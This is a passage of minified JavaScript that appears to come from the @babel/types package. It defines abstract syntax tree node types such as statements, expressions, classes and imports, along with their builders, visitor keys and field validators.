Object.assign(function(Y,W,z){(Y.operator==="in"?J:X)(Y,W,z)},{oneOfNodeTypes:["Expression","PrivateName"]})}()},right:{validate:C.assertNodeType("Expression")}},visitor:["left","right"],aliases:["Binary","Expression"]});A1("InterpreterDirective",{builder:["value"],fields:{value:{validate:C.assertValueType("string")}}});A1("Directive",{visitor:["value"],fields:{value:{validate:C.assertNodeType("DirectiveLiteral")}}});A1("DirectiveLiteral",{builder:["value"],fields:{value:{validate:C.assertValueType("string")}}});A1("BlockStatement",{builder:["body","directives"],visitor:["directives","body"],fields:{directives:{validate:C.arrayOfType("Directive"),default:[]},body:C.validateArrayOfType("Statement")},aliases:["Scopable","BlockParent","Block","Statement"]});A1("BreakStatement",{visitor:["label"],fields:{label:{validate:C.assertNodeType("Identifier"),optional:!0}},aliases:["Statement","Terminatorless","CompletionStatement"]});A1("CallExpression",{visitor:["callee","typeParameters","typeArguments","arguments"],builder:["callee","arguments"],aliases:["Expression"],fields:Object.assign({callee:{validate:C.assertNodeType("Expression","Super","V8IntrinsicIdentifier")},arguments:C.validateArrayOfType("Expression","SpreadElement","ArgumentPlaceholder"),typeArguments:{validate:C.assertNodeType("TypeParameterInstantiation"),optional:!0}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:C.assertValueType("boolean"),optional:!0},typeParameters:{validate:C.assertNodeType("TSTypeParameterInstantiation"),optional:!0}})});A1("CatchClause",{visitor:["param","body"],fields:{param:{validate:C.assertNodeType("Identifier","ArrayPattern","ObjectPattern"),optional:!0},body:{validate:C.assertNodeType("BlockStatement")}},aliases:["Scopable","BlockParent"]});A1("ConditionalExpression",{visitor:["test","consequent","alternate"],fields:{test:{validate:C.assertNodeType("Expression")},consequent:{validate:C.assertNodeType("Expression")},alternate:{validate:C.assertNodeType("Expression")}},aliases:["Expression","Conditional"]});A1("ContinueStatement",{visitor:["label"],fields:{label:{validate:C.assertNodeType("Identifier"),optional:!0}},aliases:["Statement","Terminatorless","CompletionStatement"]});A1("DebuggerStatement",{aliases:["Statement"]});A1("DoWhileStatement",{builder:["test","body"],visitor:["body","test"],fields:{test:{validate:C.assertNodeType("Expression")},body:{validate:C.assertNodeType("Statement")}},aliases:["Statement","BlockParent","Loop","While","Scopable"]});A1("EmptyStatement",{aliases:["Statement"]});A1("ExpressionStatement",{visitor:["expression"],fields:{expression:{validate:C.assertNodeType("Expression")}},aliases:["Statement","ExpressionWrapper"]});A1("File",{builder:["program","comments","tokens"],visitor:["program"],fields:{program:{validate:C.assertNodeType("Program")},comments:{validate:!process.env.BABEL_TYPES_8_BREAKING?Object.assign(()=>{},{each:{oneOfNodeTypes:["CommentBlock","CommentLine"]}}):C.assertEach(C.assertNodeType("CommentBlock","CommentLine")),optional:!0},tokens:{validate:C.assertEach(Object.assign(()=>{},{type:"any"})),optional:!0}}});A1("ForInStatement",{visitor:["left","right","body"],aliases:["Scopable","Statement","For","BlockParent","Loop","ForXStatement"],fields:{left:{validate:!process.env.BABEL_TYPES_8_BREAKING?C.assertNodeType("VariableDeclaration","LVal"):C.assertNodeType("VariableDeclaration","Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:C.assertNodeType("Expression")},body:{validate:C.assertNodeType("Statement")}}});A1("ForStatement",{visitor:["init","test","update","body"],aliases:["Scopable","Statement","For","BlockParent","Loop"],fields:{init:{validate:C.assertNodeType("VariableDeclaration","Expression"),optional:!0},test:{validate:C.assertNodeType("Expression"),optional:!0},update:{validate:C.assertNodeType("Expression"),optional:!0},body:{validate:C.assertNodeType("Statement")}}});var iJ=()=>({params:C.validateArrayOfType("FunctionParameter"),generator:{default:!1},async:{default:!1}});$B.functionCommon=iJ;var EX=()=>({returnType:{validate:C.assertNodeType("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},typeParameters:{validate:C.assertNodeType("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0}});$B.functionTypeAnnotationCommon=EX;var EB=()=>Object.assign({},iJ(),{declare:{validate:C.assertValueType("boolean"),optional:!0},id:{validate:C.assertNodeType("Identifier"),optional:!0}});$B.functionDeclarationCommon=EB;A1("FunctionDeclaration",{builder:["id","params","body","generator","async"],visitor:["id","typeParameters","params","predicate","returnType","body"],fields:Object.assign({},EB(),EX(),{body:{validate:C.assertNodeType("BlockStatement")},predicate:{validate:C.assertNodeType("DeclaredPredicate","InferredPredicate"),optional:!0}}),aliases:["Scopable","Function","BlockParent","FunctionParent","Statement","Pureish","Declaration"],validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=C.assertNodeType("Identifier");return function(J,Q,Y){if(!P9.default("ExportDefaultDeclaration",J))X(Y,"id",Y.id)}}()});A1("FunctionExpression",{inherits:"FunctionDeclaration",aliases:["Scopable","Function","BlockParent","FunctionParent","Expression","Pureish"],fields:Object.assign({},iJ(),EX(),{id:{validate:C.assertNodeType("Identifier"),optional:!0},body:{validate:C.assertNodeType("BlockStatement")},predicate:{validate:C.assertNodeType("DeclaredPredicate","InferredPredicate"),optional:!0}})});var rJ=()=>({typeAnnotation:{validate:C.assertNodeType("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},optional:{validate:C.assertValueType("boolean"),optional:!0},decorators:{validate:C.arrayOfType("Decorator"),optional:!0}});$B.patternLikeCommon=rJ;A1("Identifier",{builder:["name"],visitor:["typeAnnotation","decorators"],aliases:["Expression","FunctionParameter","PatternLike","LVal","TSEntityName"],fields:Object.assign({},rJ(),{name:{validate:process.env.BABEL_TYPES_8_BREAKING?C.chain(C.assertValueType("string"),Object.assign(function(X,J,Q){if(!Ip.default(Q,!1))throw new TypeError(`"${Q}" is not a valid identifier name`)},{type:"string"})):C.assertValueType("string")}}),validate:process.env.BABEL_TYPES_8_BREAKING?function(X,J,Q){let Y=/\.(\w+)$/.exec(J.toString());if(!Y)return;let[,W]=Y,z={computed:!1};if(W==="property"){if(P9.default("MemberExpression",X,z))return;if(P9.default("OptionalMemberExpression",X,z))return}else if(W==="key"){if(P9.default("Property",X,z))return;if(P9.default("Method",X,z))return}else if(W==="exported"){if(P9.default("ExportSpecifier",X))return}else if(W==="imported"){if(P9.default("ImportSpecifier",X,{imported:Q}))return}else if(W==="meta"){if(P9.default("MetaProperty",X,{meta:Q}))return}if((_B.isKeyword(Q.name)||_B.isReservedWord(Q.name,!1))&&Q.name!=="this")throw new TypeError(`"${Q.name}" is not a valid identifier`)}:void 0});A1("IfStatement",{visitor:["test","consequent","alternate"],aliases:["Statement","Conditional"],fields:{test:{validate:C.assertNodeType("Expression")},consequent:{validate:C.assertNodeType("Statement")},alternate:{optional:!0,validate:C.assertNodeType("Statement")}}});A1("LabeledStatement",{visitor:["label","body"],aliases:["Statement"],fields:{label:{validate:C.assertNodeType("Identifier")},body:{validate:C.assertNodeType("Statement")}}});A1("StringLiteral",{builder:["value"],fields:{value:{validate:C.assertValueType("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});A1("NumericLiteral",{builder:["value"],deprecatedAlias:"NumberLiteral",fields:{value:{validate:C.chain(C.assertValueType("number"),Object.assign(function(X,J,Q){if(1/Q<0||!Number.isFinite(Q)){let Y=new Error(`NumericLiterals must be non-negative finite numbers. You can use t.valueToNode(${Q}) instead.`)}},{type:"number"}))}},aliases:["Expression","Pureish","Literal","Immutable"]});A1("NullLiteral",{aliases:["Expression","Pureish","Literal","Immutable"]});A1("BooleanLiteral",{builder:["value"],fields:{value:{validate:C.assertValueType("boolean")}},aliases:["Expression","Pureish","Literal","Immutable"]});A1("RegExpLiteral",{builder:["pattern","flags"],deprecatedAlias:"RegexLiteral",aliases:["Expression","Pureish","Literal"],fields:{pattern:{validate:C.assertValueType("string")},flags:{validate:process.env.BABEL_TYPES_8_BREAKING?C.chain(C.assertValueType("string"),Object.assign(function(X,J,Q){let Y=/[^dgimsuvy]/.exec(Q);if(Y)throw new TypeError(`"${Y[0]}" is not a valid RegExp flag`)},{type:"string"})):C.assertValueType("string"),default:""}}});A1("LogicalExpression",{builder:["operator","left","right"],visitor:["left","right"],aliases:["Binary","Expression"],fields:{operator:{validate:C.assertOneOf(...dJ.LOGICAL_OPERATORS)},left:{validate:C.assertNodeType("Expression")},right:{validate:C.assertNodeType("Expression")}}});A1("MemberExpression",{builder:["object","property","computed",...!process.env.BABEL_TYPES_8_BREAKING?["optional"]:[]],visitor:["object","property"],aliases:["Expression","LVal","PatternLike"],fields:Object.assign({object:{validate:C.assertNodeType("Expression","Super")},property:{validate:function(){let X=C.assertNodeType("Identifier","PrivateName"),J=C.assertNodeType("Expression"),Q=function(Y,W,z){(Y.computed?J:X)(Y,W,z)};return Q.oneOfNodeTypes=["Expression","Identifier","PrivateName"],Q}()},computed:{default:!1}},!process.env.BABEL_TYPES_8_BREAKING?{optional:{validate:C.assertValueType("boolean"),optional:!0}}:{})});A1("NewExpression",{inherits:"CallExpression"});A1("Program",{visitor:["directives","body"],builder:["body","directives","sourceType","interpreter"],fields:{sourceType:{validate:C.assertOneOf("script","module"),default:"script"},interpreter:{validate:C.assertNodeType("InterpreterDirective"),default:null,optional:!0},directives:{validate:C.arrayOfType("Directive"),default:[]},body:C.validateArrayOfType("Statement")},aliases:["Scopable","BlockParent","Block"]});A1("ObjectExpression",{visitor:["properties"],aliases:["Expression"],fields:{properties:C.validateArrayOfType("ObjectMethod","ObjectProperty","SpreadElement")}});A1("ObjectMethod",{builder:["kind","key","params","body","computed","generator","async"],visitor:["decorators","key","typeParameters","params","returnType","body"],fields:Object.assign({},iJ(),EX(),{kind:Object.assign({validate:C.assertOneOf("method","get","set")},!process.env.BABEL_TYPES_8_BREAKING?{default:"method"}:{}),computed:{default:!1},key:{validate:function(){let X=C.assertNodeType("Identifier","StringLiteral","NumericLiteral","BigIntLiteral"),J=C.assertNodeType("Expression"),Q=function(Y,W,z){(Y.computed?J:X)(Y,W,z)};return Q.oneOfNodeTypes=["Expression","Identifier","StringLiteral","NumericLiteral","BigIntLiteral"],Q}()},decorators:{validate:C.arrayOfType("Decorator"),optional:!0},body:{validate:C.assertNodeType("BlockStatement")}}),aliases:["UserWhitespacable","Function","Scopable","BlockParent","FunctionParent","Method","ObjectMember"]});A1("ObjectProperty",{builder:["key","value","computed","shorthand",...!process.env.BABEL_TYPES_8_BREAKING?["decorators"]:[]],fields:{computed:{default:!1},key:{validate:function(){let X=C.assertNodeType("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","DecimalLiteral","PrivateName"),J=C.assertNodeType("Expression");return Object.assign(function(Y,W,z){(Y.computed?J:X)(Y,W,z)},{oneOfNodeTypes:["Expression","Identifier","StringLiteral","NumericLiteral","BigIntLiteral","DecimalLiteral","PrivateName"]})}()},value:{validate:C.assertNodeType("Expression","PatternLike")},shorthand:{validate:process.env.BABEL_TYPES_8_BREAKING?C.chain(C.assertValueType("boolean"),Object.assign(function(X,J,Q){if(!Q)return;if(X.computed)throw new TypeError("Property shorthand of ObjectProperty cannot be true if computed is true");if(!P9.default("Identifier",X.key))throw new TypeError("Property shorthand of ObjectProperty cannot be true if key is not an Identifier")},{type:"boolean"})):C.assertValueType("boolean"),default:!1},decorators:{validate:C.arrayOfType("Decorator"),optional:!0}},visitor:["decorators","key","value"],aliases:["UserWhitespacable","Property","ObjectMember"],validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=C.assertNodeType("Identifier","Pattern","TSAsExpression","TSSatisfiesExpression","TSNonNullExpression","TSTypeAssertion"),J=C.assertNodeType("Expression");return function(Q,Y,W){(P9.default("ObjectPattern",Q)?X:J)(W,"value",W.value)}}()});A1("RestElement",{visitor:["argument","typeAnnotation"],builder:["argument"],aliases:["FunctionParameter","PatternLike","LVal"],deprecatedAlias:"RestProperty",fields:Object.assign({},rJ(),{argument:{validate:!process.env.BABEL_TYPES_8_BREAKING?C.assertNodeType("Identifier","ArrayPattern","ObjectPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression","RestElement","AssignmentPattern"):C.assertNodeType("Identifier","ArrayPattern","ObjectPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")}}),validate:process.env.BABEL_TYPES_8_BREAKING?function(X,J){let Q=/(\w+)\[(\d+)\]/.exec(J.toString());if(!Q)throw new Error("Internal Babel error: malformed key.");let[,Y,W]=Q;if(X[Y].length>+W+1)throw new TypeError(`RestElement must be last element of ${Y}`)}:void 0});A1("ReturnStatement",{visitor:["argument"],aliases:["Statement","Terminatorless","CompletionStatement"],fields:{argument:{validate:C.assertNodeType("Expression"),optional:!0}}});A1("SequenceExpression",{visitor:["expressions"],fields:{expressions:C.validateArrayOfType("Expression")},aliases:["Expression"]});A1("ParenthesizedExpression",{visitor:["expression"],aliases:["Expression","ExpressionWrapper"],fields:{expression:{validate:C.assertNodeType("Expression")}}});A1("SwitchCase",{visitor:["test","consequent"],fields:{test:{validate:C.assertNodeType("Expression"),optional:!0},consequent:C.validateArrayOfType("Statement")}});A1("SwitchStatement",{visitor:["discriminant","cases"],aliases:["Statement","BlockParent","Scopable"],fields:{discriminant:{validate:C.assertNodeType("Expression")},cases:C.validateArrayOfType("SwitchCase")}});A1("ThisExpression",{aliases:["Expression"]});A1("ThrowStatement",{visitor:["argument"],aliases:["Statement","Terminatorless","CompletionStatement"],fields:{argument:{validate:C.assertNodeType("Expression")}}});A1("TryStatement",{visitor:["block","handler","finalizer"],aliases:["Statement"],fields:{block:{validate:process.env.BABEL_TYPES_8_BREAKING?C.chain(C.assertNodeType("BlockStatement"),Object.assign(function(X){if(!X.handler&&!X.finalizer)throw new TypeError("TryStatement expects either a handler or finalizer, or both")},{oneOfNodeTypes:["BlockStatement"]})):C.assertNodeType("BlockStatement")},handler:{optional:!0,validate:C.assertNodeType("CatchClause")},finalizer:{optional:!0,validate:C.assertNodeType("BlockStatement")}}});A1("UnaryExpression",{builder:["operator","argument","prefix"],fields:{prefix:{default:!0},argument:{validate:C.assertNodeType("Expression")},operator:{validate:C.assertOneOf(...dJ.UNARY_OPERATORS)}},visitor:["argument"],aliases:["UnaryLike","Expression"]});A1("UpdateExpression",{builder:["operator","argument","prefix"],fields:{prefix:{default:!1},argument:{validate:!process.env.BABEL_TYPES_8_BREAKING?C.assertNodeType("Expression"):C.assertNodeType("Identifier","MemberExpression")},operator:{validate:C.assertOneOf(...dJ.UPDATE_OPERATORS)}},visitor:["argument"],aliases:["Expression"]});A1("VariableDeclaration",{builder:["kind","declarations"],visitor:["declarations"],aliases:["Statement","Declaration"],fields:{declare:{validate:C.assertValueType("boolean"),optional:!0},kind:{validate:C.assertOneOf("var","let","const","using","await using")},declarations:C.validateArrayOfType("VariableDeclarator")},validate:process.env.BABEL_TYPES_8_BREAKING?(()=>{let X=C.assertNodeType("Identifier","Placeholder"),J=C.assertNodeType("Identifier","ArrayPattern","ObjectPattern","Placeholder"),Q=C.assertNodeType("Identifier","VoidPattern","Placeholder");return function(Y,W,z){let{kind:G,declarations:H}=z,U=P9.default("ForXStatement",Y,{left:z});if(U){if(H.length!==1)throw new TypeError(`Exactly one VariableDeclarator is required in the VariableDeclaration of a ${Y.type}`)}for(let K of H)if(G==="const"||G==="let"||G==="var")if(!U&&!K.init)X(K,"id",K.id);else J(K,"id",K.id);else Q(K,"id",K.id)}})():void 0});A1("VariableDeclarator",{visitor:["id","init"],fields:{id:{validate:!process.env.BABEL_TYPES_8_BREAKING?C.assertNodeType("LVal","VoidPattern"):C.assertNodeType("Identifier","ArrayPattern","ObjectPattern","VoidPattern")},definite:{optional:!0,validate:C.assertValueType("boolean")},init:{optional:!0,validate:C.assertNodeType("Expression")}}});A1("WhileStatement",{visitor:["test","body"],aliases:["Statement","BlockParent","Loop","While","Scopable"],fields:{test:{validate:C.assertNodeType("Expression")},body:{validate:C.assertNodeType("Statement")}}});A1("WithStatement",{visitor:["object","body"],aliases:["Statement"],fields:{object:{validate:C.assertNodeType("Expression")},body:{validate:C.assertNodeType("Statement")}}});A1("AssignmentPattern",{visitor:["left","right","decorators"],builder:["left","right"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},rJ(),{left:{validate:C.assertNodeType("Identifier","ObjectPattern","ArrayPattern","MemberExpression","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:C.assertNodeType("Expression")},decorators:{validate:C.arrayOfType("Decorator"),optional:!0}})});A1("ArrayPattern",{visitor:["elements","typeAnnotation"],builder:["elements"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},rJ(),{elements:{validate:C.chain(C.assertValueType("array"),C.assertEach(C.assertNodeOrValueType("null","PatternLike")))}})});A1("ArrowFunctionExpression",{builder:["params","body","async"],visitor:["typeParameters","params","predicate","returnType","body"],aliases:["Scopable","Function","BlockParent","FunctionParent","Expression","Pureish"],fields:Object.assign({},iJ(),EX(),{expression:{validate:C.assertValueType("boolean")},body:{validate:C.assertNodeType("BlockStatement","Expression")},predicate:{validate:C.assertNodeType("DeclaredPredicate","InferredPredicate"),optional:!0}})});A1("ClassBody",{visitor:["body"],fields:{body:C.validateArrayOfType("ClassMethod","ClassPrivateMethod","ClassProperty","ClassPrivateProperty","ClassAccessorProperty","TSDeclareMethod","TSIndexSignature","StaticBlock")}});A1("ClassExpression",{builder:["id","superClass","body","decorators"],visitor:["decorators","id","typeParameters","superClass","superTypeParameters","mixins","implements","body"],aliases:["Scopable","Class","Expression"],fields:{id:{validate:C.assertNodeType("Identifier"),optional:!0},typeParameters:{validate:C.assertNodeType("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0},body:{validate:C.assertNodeType("ClassBody")},superClass:{optional:!0,validate:C.assertNodeType("Expression")},["superTypeParameters"]:{validate:C.assertNodeType("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0},implements:{validate:C.arrayOfType("TSExpressionWithTypeArguments","ClassImplements"),optional:!0},decorators:{validate:C.arrayOfType("Decorator"),optional:!0},mixins:{validate:C.assertNodeType("InterfaceExtends"),optional:!0}}});A1("ClassDeclaration",{inherits:"ClassExpression",aliases:["Scopable","Class","Statement","Declaration"],fields:{id:{validate:C.assertNodeType("Identifier"),optional:!0},typeParameters:{validate:C.assertNodeType("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0},body:{validate:C.assertNodeType("ClassBody")},superClass:{optional:!0,validate:C.assertNodeType("Expression")},["superTypeParameters"]:{validate:C.assertNodeType("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0},implements:{validate:C.arrayOfType("TSExpressionWithTypeArguments","ClassImplements"),optional:!0},decorators:{validate:C.arrayOfType("Decorator"),optional:!0},mixins:{validate:C.assertNodeType("InterfaceExtends"),optional:!0},declare:{validate:C.assertValueType("boolean"),optional:!0},abstract:{validate:C.assertValueType("boolean"),optional:!0}},validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=C.assertNodeType("Identifier");return function(J,Q,Y){if(!P9.default("ExportDefaultDeclaration",J))X(Y,"id",Y.id)}}()});var CW=$B.importAttributes={attributes:{optional:!0,validate:C.arrayOfType("ImportAttribute")},assertions:{deprecated:!0,optional:!0,validate:C.arrayOfType("ImportAttribute")}};A1("ExportAllDeclaration",{builder:["source"],visitor:["source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:Object.assign({source:{validate:C.assertNodeType("StringLiteral")},exportKind:C.validateOptional(C.assertOneOf("type","value"))},CW)});A1("ExportDefaultDeclaration",{visitor:["declaration"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:{declaration:C.validateType("TSDeclareFunction","FunctionDeclaration","ClassDeclaration","Expression"),exportKind:C.validateOptional(C.assertOneOf("value"))}});A1("ExportNamedDeclaration",{builder:["declaration","specifiers","source"],visitor:["declaration","specifiers","source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:Object.assign({declaration:{optional:!0,validate:process.env.BABEL_TYPES_8_BREAKING?C.chain(C.assertNodeType("Declaration"),Object.assign(function(X,J,Q){if(Q&&X.specifiers.length)throw new TypeError("Only declaration or specifiers is allowed on ExportNamedDeclaration");if(Q&&X.source)throw new TypeError("Cannot export a declaration from a source")},{oneOfNodeTypes:["Declaration"]})):C.assertNodeType("Declaration")}},CW,{specifiers:{default:[],validate:C.arrayOf(function(){let X=C.assertNodeType("ExportSpecifier","ExportDefaultSpecifier","ExportNamespaceSpecifier"),J=C.assertNodeType("ExportSpecifier");if(!process.env.BABEL_TYPES_8_BREAKING)return X;return Object.assign(function(Q,Y,W){(Q.source?X:J)(Q,Y,W)},{oneOfNodeTypes:["ExportSpecifier","ExportDefaultSpecifier","ExportNamespaceSpecifier"]})}())},source:{validate:C.assertNodeType("StringLiteral"),optional:!0},exportKind:C.validateOptional(C.assertOneOf("type","value"))})});A1("ExportSpecifier",{visitor:["local","exported"],aliases:["ModuleSpecifier"],fields:{local:{validate:C.assertNodeType("Identifier")},exported:{validate:C.assertNodeType("Identifier","StringLiteral")},exportKind:{validate:C.assertOneOf("type","value"),optional:!0}}});A1("ForOfStatement",{visitor:["left","right","body"],builder:["left","right","body","await"],aliases:["Scopable","Statement","For","BlockParent","Loop","ForXStatement"],fields:{left:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return C.assertNodeType("VariableDeclaration","LVal");let X=C.assertNodeType("VariableDeclaration"),J=C.assertNodeType("Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression");return Object.assign(function(Q,Y,W){if(P9.default("VariableDeclaration",W))X(Q,Y,W);else J(Q,Y,W)},{oneOfNodeTypes:["VariableDeclaration","Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression"]})}()},right:{validate:C.assertNodeType("Expression")},body:{validate:C.assertNodeType("Statement")},await:{default:!1}}});A1("ImportDeclaration",{builder:["specifiers","source"],visitor:["specifiers","source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration"],fields:Object.assign({},CW,{module:{optional:!0,validate:C.assertValueType("boolean")},phase:{default:null,validate:C.assertOneOf("source","defer")},specifiers:C.validateArrayOfType("ImportSpecifier","ImportDefaultSpecifier","ImportNamespaceSpecifier"),source:{validate:C.assertNodeType("StringLiteral")},importKind:{validate:C.assertOneOf("type","typeof","value"),optional:!0}})});A1("ImportDefaultSpecifier",{visitor:["local"],aliases:["ModuleSpecifier"],fields:{local:{validate:C.assertNodeType("Identifier")}}});A1("ImportNamespaceSpecifier",{visitor:["local"],aliases:["ModuleSpecifier"],fields:{local:{validate:C.assertNodeType("Identifier")}}});A1("ImportSpecifier",{visitor:["imported","local"],builder:["local","imported"],aliases:["ModuleSpecifier"],fields:{local:{validate:C.assertNodeType("Identifier")},imported:{validate:C.assertNodeType("Identifier","StringLiteral")},importKind:{validate:C.assertOneOf("type","typeof","value"),optional:!0}}});A1("ImportExpression",{visitor:["source","options"],aliases:["Expression"],fields:{phase:{default:null,validate:C.assertOneOf("source","defer")},source:{validate:C.assertNodeType("Expression")},options:{validate:C.assertNodeType("Expression"),optional:!0}}});A1("MetaProperty",{visitor:["meta","property"],aliases:["Expression"],fields:{meta:{validate:process.env.BABEL_TYPES_8_BREAKING?C.chain(C.assertNodeType("Identifier"),Object.assign(function(X,J,Q){let Y;switch(Q.name){case"function":Y="sent";break;case"new":Y="target";break;case"import":Y="meta";break}if(!P9.default("Identifier",X.property,{name:Y}))throw new TypeError("Unrecognised MetaProperty")},{oneOfNodeTypes:["Identifier"]})):C.assertNodeType("Identifier")},property:{validate:C.assertNodeType("Identifier")}}});var A4=()=>({abstract:{validate:C.assertValueType("boolean"),optional:!0},accessibility:{validate:C.assertOneOf("public","private","protected"),optional:!0},static:{default:!1},override:{default:!1},computed:{default:!1},optional:{validate:C.assertValueType("boolean"),optional:!0},key:{validate:C.chain(function(){let X=C.assertNodeType("Identifier","StringLiteral","NumericLiteral","BigIntLiteral"),J=C.assertNodeType("Expression");return function(Q,Y,W){(Q.computed?J:X)(Q,Y,W)}}(),C.assertNodeType("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","Expression"))}});$B.classMethodOrPropertyCommon=A4;var PW=()=>Object.assign({},iJ(),A4(),{params:C.validateArrayOfType("FunctionParameter","TSParameterProperty"),kind:{validate:C.assertOneOf("get","set","method","constructor"),default:"method"},access:{validate:C.chain(C.assertValueType("string"),C.assertOneOf("public","private","protected")),optional:!0},decorators:{validate:C.arrayOfType("Decorator"),optional:!0}});$B.classMethodOrDeclareMethodCommon=PW;A1("ClassMethod",{aliases:["Function","Scopable","BlockParent","FunctionParent","Method"],builder:["kind","key","params","body","computed","static","generator","async"],visitor:["decorators","key","typeParameters","params","returnType","body"],fields:Object.assign({},PW(),EX(),{body:{validate:C.assertNodeType("BlockStatement")}})});A1("ObjectPattern",{visitor:["decorators","properties","typeAnnotation"],builder:["properties"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},rJ(),{properties:C.validateArrayOfType("RestElement","ObjectProperty")})});A1("SpreadElement",{visitor:["argument"],aliases:["UnaryLike"],deprecatedAlias:"SpreadProperty",fields:{argument:{validate:C.assertNodeType("Expression")}}});A1("Super",{aliases:["Expression"]});A1("TaggedTemplateExpression",{visitor:["tag","typeParameters","quasi"],builder:["tag","quasi"],aliases:["Expression"],fields:{tag:{validate:C.assertNodeType("Expression")},quasi:{validate:C.assertNodeType("TemplateLiteral")},["typeParameters"]:{validate:C.assertNodeType("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0}}});A1("TemplateElement",{builder:["value","tail"],fields:{value:{validate:C.chain(C.assertShape({raw:{validate:C.assertValueType("string")},cooked:{validate:C.assertValueType("string"),optional:!0}}),function X(J){let Q=J.value.raw,Y=!1,W=()=>{throw new Error("Internal @babel/types error.")},{str:z,firstInvalidLoc:G}=Cp.readStringContents("template",Q,0,0,0,{unterminated(){Y=!0},strictNumericEscape:W,invalidEscapeSequence:W,numericSeparatorInEscapeSequence:W,unexpectedNumericSeparator:W,invalidDigit:W,invalidCodePoint:W});if(!Y)throw new Error("Invalid raw");J.value.cooked=G?null:z})},tail:{default:!1}}});A1("TemplateLiteral",{visitor:["quasis","expressions"],aliases:["Expression","Literal"],fields:{quasis:C.validateArrayOfType("TemplateElement"),expressions:{validate:C.chain(C.assertValueType("array"),C.assertEach(C.assertNodeType("Expression","TSType")),function(X,J,Q){if(X.quasis.length!==Q.length+1)throw new TypeError(`Number of ${X.type} quasis should be exactly one more than the number of expressions.
Expected ${Q.length+1} quasis but got ${X.quasis.length}`)})}}});A1("YieldExpression",{builder:["argument","delegate"],visitor:["argument"],aliases:["Expression","Terminatorless"],fields:{delegate:{validate:process.env.BABEL_TYPES_8_BREAKING?C.chain(C.assertValueType("boolean"),Object.assign(function(X,J,Q){if(Q&&!X.argument)throw new TypeError("Property delegate of YieldExpression cannot be true if there is no argument")},{type:"boolean"})):C.assertValueType("boolean"),default:!1},argument:{optional:!0,validate:C.assertNodeType("Expression")}}});A1("AwaitExpression",{builder:["argument"],visitor:["argument"],aliases:["Expression","Terminatorless"],fields:{argument:{validate:C.assertNodeType("Expression")}}});A1("Import",{aliases:["Expression"]});A1("BigIntLiteral",{builder:["value"],fields:{value:{validate:C.assertValueType("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});A1("ExportNamespaceSpecifier",{visitor:["exported"],aliases:["ModuleSpecifier"],fields:{exported:{validate:C.assertNodeType("Identifier")}}});A1("OptionalMemberExpression",{builder:["object","property","computed","optional"],visitor:["object","property"],aliases:["Expression"],fields:{object:{validate:C.assertNodeType("Expression")},property:{validate:function(){let X=C.assertNodeType("Identifier"),J=C.assertNodeType("Expression");return Object.assign(function(Y,W,z){(Y.computed?J:X)(Y,W,z)},{oneOfNodeTypes:["Expression","Identifier"]})}()},computed:{default:!1},optional:{validate:!process.env.BABEL_TYPES_8_BREAKING?C.assertValueType("boolean"):C.chain(C.assertValueType("boolean"),C.assertOptionalChainStart())}}});A1("OptionalCallExpression",{visitor:["callee","typeParameters","typeArguments","arguments"],builder:["callee","arguments","optional"],aliases:["Expression"],fields:Object.assign({callee:{validate:C.assertNodeType("Expression")},arguments:C.validateArrayOfType("Expression","SpreadElement","ArgumentPlaceholder"),optional:{validate:!process.env.BABEL_TYPES_8_BREAKING?C.assertValueType("boolean"):C.chain(C.assertValueType("boolean"),C.assertOptionalChainStart())},typeArguments:{validate:C.assertNodeType("TypeParameterInstantiation"),optional:!0}},{typeParameters:{validate:C.assertNodeType("TSTypeParameterInstantiation"),optional:!0}})});A1("ClassProperty",{visitor:["decorators","variance","key","typeAnnotation","value"],builder:["key","value","typeAnnotation","decorators","computed","static"],aliases:["Property"],fields:Object.assign({},A4(),{value:{validate:C.assertNodeType("Expression"),optional:!0},definite:{validate:C.assertValueType("boolean"),optional:!0},typeAnnotation:{validate:C.assertNodeType("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:C.arrayOfType("Decorator"),optional:!0},readonly:{validate:C.assertValueType("boolean"),optional:!0},declare:{validate:C.assertValueType("boolean"),optional:!0},variance:{validate:C.assertNodeType("Variance"),optional:!0}})});A1("ClassAccessorProperty",{visitor:["decorators","key","typeAnnotation","value"],builder:["key","value","typeAnnotation","decorators","computed","static"],aliases:["Property","Accessor"],fields:Object.assign({},A4(),{key:{validate:C.chain(function(){let 